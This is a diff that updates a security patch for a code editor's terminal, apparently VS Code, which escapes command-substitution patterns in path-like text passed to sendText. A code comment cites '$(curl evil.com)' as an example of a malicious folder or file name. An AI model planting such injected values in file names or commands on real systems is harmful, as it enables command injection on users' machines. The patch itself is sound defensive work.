@@ -6,10 +6,10 @@ terminal.sendText(). This patch escapes $(), ${}, and backtick command
 substitution patterns when followed by / (path context) before the text
 is written to the terminal process.
 
-Index: b/src/vs/platform/terminal/common/terminalEnvironment.ts
+Index: code-editor-src/src/vs/platform/terminal/common/terminalEnvironment.ts
 ===================================================================
---- a/src/vs/platform/terminal/common/terminalEnvironment.ts
-+++ b/src/vs/platform/terminal/common/terminalEnvironment.ts
+--- code-editor-src.orig/src/vs/platform/terminal/common/terminalEnvironment.ts
++++ code-editor-src/src/vs/platform/terminal/common/terminalEnvironment.ts
 @@ -126,3 +126,34 @@ export function sanitizeCwd(cwd: string)
  export function shouldUseEnvironmentVariableCollection(slc: IShellLaunchConfig): boolean {
  	return !slc.strictEnv;
@@ -45,10 +45,10 @@ Index: b/src/vs/platform/terminal/common/terminalEnvironment.ts
 +
 +	return result;
 +}
-Index: b/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
+Index: code-editor-src/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
 ===================================================================
---- a/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
-+++ b/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
+--- code-editor-src.orig/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
++++ code-editor-src/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
 @@ -48,6 +48,7 @@ import { IEnvironmentVariableCollection,
  import { deserializeEnvironmentVariableCollections } from '../../../../platform/terminal/common/environmentVariableShared.js';
  import { GeneralShellType, IProcessDataEvent, IProcessPropertyMap, IReconnectionProperties, IShellLaunchConfig, ITerminalDimensionsOverride, ITerminalLaunchError, ITerminalLogService, PosixShellType, ProcessPropertyType, ShellIntegrationStatus, TerminalExitReason, TerminalIcon, TerminalLocation, TerminalSettingId, TerminalShellType, TitleEventSource, WindowsShellType, type ShellIntegrationInjectionFailureReason } from '../../../../platform/terminal/common/terminal.js';
@@ -57,13 +57,13 @@ Index: b/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
  import { editorBackground } from '../../../../platform/theme/common/colorRegistry.js';
  import { getIconRegistry } from '../../../../platform/theme/common/iconRegistry.js';
  import { IColorTheme, IThemeService } from '../../../../platform/theme/common/themeService.js';
-@@ -1341,6 +1342,9 @@
+@@ -1356,6 +1357,9 @@ export class TerminalInstance extends Di
  	}
  
- 	async sendText(text: string, shouldExecute: boolean, bracketedPasteMode?: boolean): Promise<void> {
+ 	async sendText(text: string, shouldExecute: boolean, forceBracketedPasteMode?: boolean): Promise<void> {
 +		// Sanitize command substitution patterns ($(), ${}, ``) in path-like segments
 +		// to prevent injection via malicious folder/file names (e.g., $(curl evil.com))
 +		text = sanitizeCdPathsInCommand(text);
  		// Apply bracketed paste sequences if the terminal has the mode enabled, this will prevent
  		// the text from triggering keybindings and ensure new lines are handled properly
- 		if (bracketedPasteMode && this.xterm?.raw.modes.bracketedPasteMode) {
+ 		if (forceBracketedPasteMode && this.xterm?.raw.modes.bracketedPasteMode) {
